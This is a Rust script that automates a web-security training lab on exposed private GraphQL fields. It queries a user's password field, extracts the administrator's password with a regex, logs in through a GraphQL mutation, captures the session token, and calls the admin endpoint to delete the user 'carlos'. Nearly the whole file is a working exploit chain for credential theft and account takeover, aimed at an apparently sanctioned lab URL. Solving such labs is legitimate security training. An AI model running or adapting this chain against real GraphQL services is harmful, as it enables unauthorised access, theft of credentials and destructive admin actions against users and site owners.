/******************************************************
*
* Lab: Accidental exposure of private GraphQL fields
*
* Hack Steps:
*      1. Query the hidden post
*      2. Extract administrator's password
*      3. Login as administrator
*      4. Extract administrator's token
*      5. Delete carlos from the admin panel
*
*******************************************************/
use lazy_static::lazy_static;
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a35001003377886895ab00700f50080.web-security-academy.net";

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    print!("⦗1⦘ Querying the hidden post.. ");
    flush_terminal();

    let payload = r###"query getBlogSummaries {
                            getUser(id: 1) {
                                password
                            }
                        }"###;
    let query = query_user(payload);

    println!("{}", "OK".green());
    print!("⦗2⦘ Extracting administrator's password.. ");
    flush_terminal();

    let query_result = query.text().unwrap();
    let admin_password = capture_pattern_from_text(r###""password": "(\w*)""###, &query_result);

    println!("{} => {}", "OK".green(), admin_password.yellow());
    print!("⦗3⦘ Logging in as administrator.. ");
    flush_terminal();

    let admin_login = login_as_admin(&admin_password);

    println!("{}", "OK".green());
    print!("⦗4⦘ Extracting administrator's token.. ");
    flush_terminal();

    let query_result = admin_login.text().unwrap();
    let admin_token = capture_pattern_from_text(r###"token": "(\w*)""###, &query_result);

    println!("{} => {}", "OK".green(), admin_token.yellow());
    print!("⦗5⦘ Deleting carlos from the admin panel.. ");
    flush_terminal();

    delete_carlos(&admin_token);

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn query_user(payload: &str) -> Response {
    let body_json =
        format!(r###"{{ "query": "{payload}", "operationName": "getBlogSummaries" }}"###);

    WEB_CLIENT
        .post(format!("{LAB_URL}/graphql/v1"))
        .header("Content-Type", "application/json")
        .body(body_json)
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to query hte user".red()))
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

fn login_as_admin(admin_password: &str) -> Response {
    let mutation = format!(
        r###"mutation login {{
                login(input: {{ username: \"administrator\", password: \"{admin_password}\" }}) {{
                    token
                    success
                }}
            }}"###
    );
    let body_json = format!(r###"{{ "query": "{mutation}", "operationName": "login" }}"###);

    WEB_CLIENT
        .post(format!("{LAB_URL}/graphql/v1"))
        .header("Content-Type", "application/json")
        .body(body_json)
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to login as admin".red()))
}

fn delete_carlos(session: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}/admin/delete?username=carlos"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to delete carlos from the admin panel".red()
        ))
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
